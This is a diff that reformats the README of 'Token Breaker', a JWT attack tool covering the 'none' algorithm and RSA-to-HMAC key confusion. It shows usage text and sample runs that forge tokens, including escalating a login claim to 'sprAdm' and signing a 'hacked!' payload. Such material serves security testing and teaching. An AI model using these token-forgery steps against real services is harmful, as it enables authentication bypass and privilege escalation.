@@ -2,18 +2,15 @@
 
 Token Breaker is focused on 2 particular vulnerability related to JWT tokens.
 
-<ul>
-  <li>None Algorithm</li>
-  <li>RSAtoHMAC</li>
-</ul>
+ - None Algorithm
+ - RSAtoHMAC
 
-Refer to <a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" >this</a> link about insights of the vulnerability and how an attacker can forge the tokens
+Refer to [this](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/) link about insights of the vulnerability and how an attacker can forge the tokens
 
-<p>Try out this vulnerability <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php?">here</a></p>
+Try out this vulnerability [this](http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php?)
 
-<h1>TheNone Usage</h1>
-<code>
-<pre>
+## TheNone Usage
+```
 usage: TheNone.py [-h] -t TOKEN
 
 TokenBreaker: 1.TheNoneAlgorithm
@@ -26,26 +23,24 @@ required arguments:
                         JWT Token value
 
 Example Usage: python TheNone.py -t [JWTtoken]
-</pre>
-</code>
+```
 
-<h1>Output</h1>
-<code><pre>
-./TheNone.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImFkbSIsImlhdCI6IjE1Mzc1MjMxMjIifQ.ZWZhNjRmZDgzYWYzNDcxMjk5OTQ4YzE0NDVjMTNhZmJmYTQ5ZDhmYjY0ZDgyMzlhMjMwMGJlMTRhODA2NGU4MQ
+### Output
+```
+$ ./TheNone.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImFkbSIsImlhdCI6IjE1Mzc1MjMxMjIifQ.ZWZhNjRmZDgzYWYzNDcxMjk5OTQ4YzE0NDVjMTNhZmJmYTQ5ZDhmYjY0ZDgyMzlhMjMwMGJlMTRhODA2NGU4MQ
 
-Decoded Header value is : {"alg":"HS256","typ":"JWS"}
-Decode Payload value is : {"login":"adm","iat":"1537523122"}
+TheNone
 
-New header value with none algorithm:
-{"alg":"none","typ":"JWS"}
+[*] Decoded Header value is: {"alg":"HS256","typ":"JWS"}
+[*] Decoded Payload value is: {"login":"adm","iat":"1537523122"}
+[*] New header value with none algorithm: {"alg":"None","typ":"JWS"}
+[<] Modify Header? [y/N]: n
+[<] Enter your payload: {"login":"sprAdm","iat":"0"}
+[+] Successfully encoded Token: eyJhbGciOiJOb25lIiwidHlwIjoiSldTIn0.eyJsb2dpbiI6InNwckFkbSIsImlhdCI6IjAifQ.
+```
 
-Successfully encoded Token: 
-eyJhbGciOiJub25lIiwidHlwIjoiSldTIn0.eyJsb2dpbiI6ImFkbSIsImlhdCI6IjE1Mzc1MjMxMjIifQ.
-</pre></code>
-
-
-<h1>RSAtoHMAC Usage</h1>
-<code><pre>
+## RSAtoHMAC Usage
+```
 usage: RsaToHmac.py [-h] -t TOKEN -p PUBKEY
 
 TokenBreaker: 1.RSAtoHMAC
@@ -58,20 +53,18 @@ required arguments:
   -p PUBKEY, --pubkey PUBKEY        Path to Public key File
 
 Example Usage: python RsatoHMAC.py -t [JWTtoken] -p [PathtoPublickeyfile]</pre></code>
+```
 
-<h1>Output</h1>
-<code><pre>
-./RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUzNzUxODczMiwiZXhwIjoxNTM3NTE4ODUyLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.GwWRgb31V7OaxFt9wMd8LlLWWi4Z3zJ4NL7k38yz2mRYzKht1cFYrsxQv4DJdGLwV6D6L08iwF7_J90usGnJoLw8OLVUZvcDRH8rgGtpICSjhv1qaWiHW4-Gcqet4NieJLuvZzJn2imV2-x5TUDJJICKUaj183EvuJTOnjWuD0-ieT3ixhXbm0-E_9LqsGIUJrRQZfPkFOgpH8OLaJYscJwUghWOEphYV-jeek91Qu3TJkeXUuIUUuCF_l6x3eIHheQ0eYLuFc7Ug85HFWemeQ4rK7kMr8sDd3YKnFwZIoDPF6gnnr3lNOydDbpjn-KHnu1oU0E2zk1NIgHPs4TVww -p /tmp/pub
+### Output
+```
+$ ./RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU0MDM3NjA2MSwiZXhwIjoxNTQwMzc2MTgxLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.HI50KvoHzcf7znWkrdugn5-O-68PpJAeiS21cLisC1WgEI21gWnqqvv3oqsnzbGkIt21NvPVHWFXoKJmLPKHeMeYLgc7nuVdF37WWd7M1XzZEP8zLoed7Z6K0KfNuR_CRsjogv1KAt8fJQvRzRhFi9dORHGxWRqpiInIgLKROLgXB-7Rv2SOYdyD_XylRaVJ1JpmmCyVmIbzVWhVuRJWT59AUm43yYRP3bBt-bnhMfkzFpwxTk3O84-On4DoIt6NIkRJaxXDUdDKscLGmSWQmdZsZds3XSV0ZgN0PObADqkZwwCBAqUTT7l5BVcBmasdnNuZ8cCDKzNtJr2cdow6zQ -p public.pem
 
-Decoded Header value is : {"typ":"JWT","alg":"RS256"}
-Decode Payload value is : {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1537518732,"exp":1537518852,"data":{"hello":"world"}}
+RSA to HMAC
 
-Enter your header Value: {"typ":"JWT","alg":"HS256"}
-Enter your payload value: {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1537518732,"exp":1537518852,"data":{"hello":"world"}}
-
-Successfully encoded Token: 
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUzNzUxODczMiwiZXhwIjoxNTM3NTE4ODUyLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.aZ03C84GU7WfIFsyvRzr9NUhtDQttOvA6CW5fUxGXmU
-</pre></code>
-
-
-
+[*] Decoded Header value: {"typ":"JWT","alg":"RS256"}
+[*] Decode Payload value: {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1540376061,"exp":1540376181,"data":{"hello":"world"}}
+[*] New header value with HMAC: {"typ":"JWT","alg":"HS256"}
+[<] Modify Header? [y/N]: n
+[<] Enter Your Payload value: {"iss":"http:\/\/www.google.com\/","iat":2351287873,"exp":1843945693,"data":{"hello":"hacked!"}}
+[+] Successfully Encoded Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC93d3cuZ29vZ2xlLmNvbVwvIiwiaWF0IjoyMzUxMjg3ODczLCJleHAiOjE4NDM5NDU2OTMsImRhdGEiOnsiaGVsbG8iOiJoYWNrZWQhIn19.8jfUVCZPA7cWaSfe0LIjRt692RaFHnnvtw0jHoSAneQ
+```
